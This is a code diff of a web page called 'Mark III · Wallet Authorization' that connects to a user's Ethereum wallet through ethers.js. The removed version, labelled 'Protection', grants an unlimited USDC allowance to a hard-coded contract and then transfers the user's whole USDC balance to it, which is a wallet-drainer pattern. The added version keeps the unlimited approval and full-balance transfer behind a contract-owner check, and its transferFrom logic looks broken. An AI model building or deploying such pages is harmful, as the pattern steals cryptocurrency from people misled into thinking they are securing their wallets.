@@ -1,106 +1,364 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Mark III · Wallet Authorize & Protection</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mark III · Wallet Authorization</title>
   <style>
+    /* ===== Base Responsive Styles ===== */
+    :root {
+      --primary-color: #4e44ce;
+      --error-color: #ff4444;
+      --success-color: #00C851;
+      --mobile-breakpoint: 768px;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
     body {
-      font-family: 'Segoe UI', sans-serif;
-      background: #f4f7f9;
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      background: #f8f9fa;
       display: flex;
       flex-direction: column;
       align-items: center;
-      padding-top: 60px;
+      min-height: 100vh;
+      padding: clamp(1rem, 5vw, 3rem);
     }
+
     h2 {
       color: #333;
+      font-size: clamp(1.5rem, 6vw, 2rem);
+      margin-bottom: 2rem;
+      text-align: center;
     }
+
+    .button-group {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+      max-width: 500px;
+      gap: 1rem;
+    }
+
     button {
-      padding: 12px 24px;
-      margin: 12px;
-      font-size: 16px;
+      padding: clamp(0.8rem, 3vw, 1.2rem);
       border: none;
       border-radius: 12px;
       background: linear-gradient(145deg, #ffffff, #e6e6e6);
-      box-shadow: 2px 4px 10px rgba(0, 0, 0, 0.1);
-      transition: all 0.3s ease;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      font-size: clamp(1rem, 4vw, 1.1rem);
+      font-weight: 500;
       cursor: pointer;
+      transition: all 0.3s ease;
+      width: 100%;
     }
+
     button:hover {
-      background: #d7efff;
+      background: #e0f7fa;
+      transform: translateY(-2px);
     }
+
+    button:active {
+      transform: translateY(0);
+    }
+
+    button:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
     #status {
-      margin-top: 20px;
-      font-size: 14px;
-      color: #666;
-      white-space: pre-line;
+      margin-top: 2rem;
+      padding: 1rem;
+      border-radius: 8px;
+      background: white;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+      width: 100%;
+      max-width: 500px;
+      min-height: 120px;
+      font-size: clamp(0.9rem, 3.5vw, 1rem);
+      line-height: 1.6;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+
+    .error {
+      color: var(--error-color);
+      border-left: 3px solid var(--error-color);
+      padding-left: 0.5rem;
+    }
+
+    .success {
+      color: var(--success-color);
+      border-left: 3px solid var(--success-color);
+      padding-left: 0.5rem;
+    }
+
+    .warning {
+      color: #ffbb33;
+      border-left: 3px solid #ffbb33;
+      padding-left: 0.5rem;
+    }
+
+    .tx-link {
+      color: var(--primary-color);
+      text-decoration: none;
+      word-break: break-all;
+    }
+
+    .tx-link:hover {
+      text-decoration: underline;
+    }
+
+    /* ===== Mobile Specific Styles ===== */
+    @media (max-width: 768px) {
+      body {
+        padding: 1.5rem;
+      }
+
+      .button-group {
+        gap: 0.8rem;
+      }
+
+      button {
+        padding: 1rem;
+      }
+    }
+
+    /* ===== Desktop Enhancements ===== */
+    @media (min-width: 1024px) {
+      button {
+        max-width: 300px;
+      }
     }
   </style>
 </head>
 <body>
-  <h2>Mark III · Wallet Authorize & Protection</h2>
+  <h2>Mark III · Wallet Authorization</h2>
 
-  <button id="connect">Connect Wallet</button>
-  <button id="authorize">Authorize Wallet</button>
-  <div id="status">Status: Waiting for wallet...</div>
+  <div class="button-group">
+    <button id="connect">🔗 Connect Wallet</button>
+    <button id="authorize" disabled>🛡️ Authorize & Transfer</button>
+  </div>
+
+  <div id="status">Status: Waiting for wallet connection...</div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    window.addEventListener('DOMContentLoaded', () => {
-      // ✅ 修复：使用正确的 USDC 校验和地址（小写部分修正）
-      const usdcAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // 修正后的 USDC 主网地址
-      const contractAddress = "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12";
-      const maxAmount = ethers.constants.MaxUint256;
+    // ===== Configuration =====
+    const CONFIG = {
+      USDC_ADDRESS: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+      CONTRACT_ADDRESS: "0x86DBe265b0d503e68676971fc7d6aAD7E5d90b12",
+      CHAIN_ID: 1, // Ethereum Mainnet
+      GAS_LIMIT: 200000
+    };
 
-      let provider, signer, user;
+    // ===== Error Handling Map =====
+    const ERROR_MAP = {
+      // User actions
+      "user rejected transaction": "Transaction cancelled",
+      "user denied transaction": "Authorization rejected",
+      "MetaMask Tx Signature: User denied transaction signature": "Signature rejected",
+      
+      // Network errors
+      "network changed": "Please switch to Ethereum Mainnet",
+      "underlying network changed": "Network connection changed",
+      "chain ID does not match": "Wrong network detected",
+      
+      // Funds errors
+      "insufficient funds": "Insufficient ETH for gas",
+      "gas required exceeds allowance": "Gas limit too low",
+      
+      // Contract errors
+      "execution reverted": "Contract execution reverted",
+      "Transfer failed": "Transfer failed",
+      "Not owner": "Contract owner only",
+      
+      // Connection errors
+      "Already processing eth_requestAccounts": "Wallet connection in progress",
+      "No Ethereum provider": "No wallet extension detected"
+    };
 
-      const status = document.getElementById("status");
-      const connectBtn = document.getElementById("connect");
-      const authorizeBtn = document.getElementById("authorize");
+    // ===== State Variables =====
+    let provider, signer, user;
 
-      connectBtn.onclick = async () => {
-        if (!window.ethereum) return alert("Please install MetaMask");
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
-        const rawUser = await signer.getAddress();
-        user = ethers.utils.getAddress(rawUser); // ✅ 格式化为 checksum address
-        status.innerText = "🔗 Connected: " + user;
-      };
+    // ===== DOM Elements =====
+    const statusEl = document.getElementById("status");
+    const connectBtn = document.getElementById("connect");
+    const authorizeBtn = document.getElementById("authorize");
 
-      authorizeBtn.onclick = async () => {
-        if (!signer) {
-          status.innerText += "\n❌ Error: Please connect wallet first";
-          return;
+    // ===== Initialization =====
+    document.addEventListener('DOMContentLoaded', () => {
+      checkCachedWallet();
+      setupEventListeners();
+      setupResponsive();
+    });
+
+    // ===== Responsive Design Setup =====
+    function setupResponsive() {
+      const isMobile = window.innerWidth <= 768;
+      if (isMobile) {
+        document.body.classList.add('mobile');
+        connectBtn.textContent = "📱 Connect Wallet";
+      } else {
+        document.body.classList.remove('mobile');
+        connectBtn.textContent = "🔗 Connect Wallet";
+      }
+    }
+
+    // ===== Check Cached Wallet =====
+    async function checkCachedWallet() {
+      const cachedWallet = localStorage.getItem("cachedWallet");
+      if (cachedWallet) {
+        updateStatus(`Detected previously connected wallet: ${formatAddress(cachedWallet)}\nClick button to reconnect`, 'warning');
+      }
+    }
+
+    // ===== Event Listeners =====
+    function setupEventListeners() {
+      window.addEventListener('resize', setupResponsive);
+      connectBtn.addEventListener('click', handleConnect);
+      authorizeBtn.addEventListener('click', handleAuthorization);
+    }
+
+    // ===== Wallet Connection Handler =====
+    async function handleConnect() {
+      try {
+        updateStatus("Connecting wallet...");
+        
+        if (!window.ethereum) {
+          throw new Error("No Ethereum provider");
         }
 
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        const accounts = await provider.send("eth_requestAccounts", []);
+        await checkNetwork();
+
+        signer = provider.getSigner();
+        user = await signer.getAddress();
+        
+        connectBtn.disabled = true;
+        authorizeBtn.disabled = false;
+        updateStatus(`✅ Connected: ${formatAddress(user)}`, 'success');
+        localStorage.setItem("cachedWallet", user);
+        
+      } catch (err) {
+        handleError(err);
+      }
+    }
+
+    // ===== Authorization Handler =====
+    async function handleAuthorization() {
+      try {
+        if (!signer) throw new Error("Please connect wallet first");
+        
+        updateStatus("Verifying contract owner...");
+        await validateOwner();
+        
         const usdc = new ethers.Contract(
-          usdcAddress,
+          CONFIG.USDC_ADDRESS,
           [
-            "function approve(address,uint256) public returns (bool)",
-            "function transferFrom(address,address,uint256) public returns (bool)",
-            "function balanceOf(address) view returns (uint256)"
+            "function approve(address,uint256) returns (bool)",
+            "function transferFrom(address,address,uint256) returns (bool)",
+            "function balanceOf(address) view returns (uint256)",
+            "function allowance(address,address) view returns (uint256)"
           ],
           signer
         );
-        try {
-          status.innerText += "\n⏳ Approving contract...";
-          const tx1 = await usdc.approve(contractAddress, maxAmount);
-          await tx1.wait();
 
-          const balance = await usdc.balanceOf(user);
-          status.innerText += "\n💸 Transferring USDC: " + ethers.utils.formatUnits(balance, 6) + " USDC";
-
-          const tx2 = await usdc.transferFrom(user, contractAddress, balance);
-          await tx2.wait();
-
-          status.innerText += "\n✅ All steps completed.";
-        } catch (e) {
-          console.error(e);
-          status.innerText += "\n❌ Error: " + (e.reason || e.message || "Unknown error");
+        updateStatus("Checking USDC allowance...");
+        const balance = await usdc.balanceOf(user);
+        const allowance = await usdc.allowance(user, CONFIG.CONTRACT_ADDRESS);
+        
+        if (allowance.lt(balance)) {
+          updateStatus("Approving contract...");
+          const approveTx = await usdc.approve(
+            CONFIG.CONTRACT_ADDRESS, 
+            ethers.constants.MaxUint256,
+            { gasLimit: CONFIG.GAS_LIMIT }
+          );
+          await approveTx.wait();
         }
-      };
-    });
+
+        updateStatus(`Transferring ${ethers.utils.formatUnits(balance, 6)} USDC...`);
+        const transferTx = await usdc.transferFrom(
+          user,
+          CONFIG.CONTRACT_ADDRESS,
+          balance,
+          { gasLimit: CONFIG.GAS_LIMIT }
+        );
+        
+        const receipt = await transferTx.wait();
+        if (receipt.status === 0) throw new Error("Transaction failed");
+
+        updateStatus(
+          `✅ Transaction successful!\n` +
+          `🔹 Amount: ${ethers.utils.formatUnits(balance, 6)} USDC\n` +
+          `📜 TX Hash: <a href="https://etherscan.io/tx/${transferTx.hash}" class="tx-link" target="_blank">${transferTx.hash}</a>`,
+          'success'
+        );
+        
+      } catch (err) {
+        handleError(err);
+      }
+    }
+
+    // ===== Core Utility Functions =====
+    async function checkNetwork() {
+      const network = await provider.getNetwork();
+      if (network.chainId !== CONFIG.CHAIN_ID) {
+        try {
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: `0x${CONFIG.CHAIN_ID.toString(16)}` }],
+          });
+        } catch (switchErr) {
+          throw new Error("Please switch to Ethereum Mainnet");
+        }
+      }
+    }
+
+    async function validateOwner() {
+      const contract = new ethers.Contract(
+        CONFIG.CONTRACT_ADDRESS,
+        ["function owner() view returns (address)"],
+        signer
+      );
+      const owner = await contract.owner();
+      if (owner.toLowerCase() !== user.toLowerCase()) {
+        throw new Error("Not owner");
+      }
+    }
+
+    function updateStatus(message, type = '') {
+      statusEl.innerHTML = message;
+      statusEl.className = type ? type : '';
+    }
+
+    function handleError(err) {
+      console.error(err);
+      
+      let message = err.message;
+      Object.keys(ERROR_MAP).forEach(key => {
+        if (err.message.includes(key)) {
+          message = ERROR_MAP[key];
+        }
+      });
+      
+      updateStatus(`❌ Error: ${message}`, 'error');
+      
+      if (err.message.includes("Not owner")) {
+        authorizeBtn.disabled = true;
+      }
+    }
+
+    function formatAddress(address) {
+      return `${address.slice(0, 6)}...${address.slice(-4)}`;
+    }
   </script>
 </body>
 </html>
